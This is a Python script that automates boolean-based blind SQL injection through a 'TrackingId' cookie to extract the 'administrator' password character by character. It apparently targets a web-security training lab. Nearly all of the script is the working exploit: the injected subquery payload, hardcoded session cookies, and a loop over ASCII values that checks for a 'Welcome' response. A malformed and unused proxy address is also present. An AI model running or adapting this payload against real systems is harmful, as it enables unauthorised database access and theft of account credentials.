import sys
import requests
import urllib3
import urllib
import asyncio
import aiohttp 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "https://1270.0.1:8080"
}

password_extracted = {}

"""
Get the character for a single position.
Character is saved in the global variable "password_extracted".
"""
async def getChar(position, url):
    for j in range(32, 126):
        #sys.stdout.write("Trying char %s at pos %s\n" % (chr(j), position))
        #sys.stdout.write("password_extracted: %s" % password_extracted)
        sys.stdout.flush()
        sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (position, j)
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        cookies = {
            "TrackingId": "7Rh903HXWXYcVYbT" + sqli_payload_encoded,
            "session": "n5P2GzbUCXaKRhNMYtHgqJsdpifQOsyk"
        }
        r = requests.get(url, cookies=cookies, verify=False)
        if "Welcome" in r.text:
            sys.stdout.write(chr(j))
            sys.stdout.flush()
            password_extracted[position] = chr(j)
            return

async def runParallel(url):
    rangeNums = list(range(1, 21))
    tasks = [getChar(i, url) for i in rangeNums]
    await asyncio.gather(*tasks)


def sqli_password(url):
    password_extracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i, j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {
                "TrackingId": "yFRfxYc2JYHZ0K8v" + sqli_payload_encoded,
                "session": "QEw4PHGMxLHZUCIJPVQILnpzxeWvmxLp"
            }
            #sys.stdout.write("cookie payload: %s, encoded cookie: %s" % (sqli_payload, cookies["TrackingId"]))
            r = requests.get(url, cookies=cookies, verify=False)
            if "Welcome" not in r.text:
                sys.stdout.write("\r" + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write("\r" + password_extracted)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        return

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    asyncio.run(runParallel(url))

if __name__ == "__main__":
    main()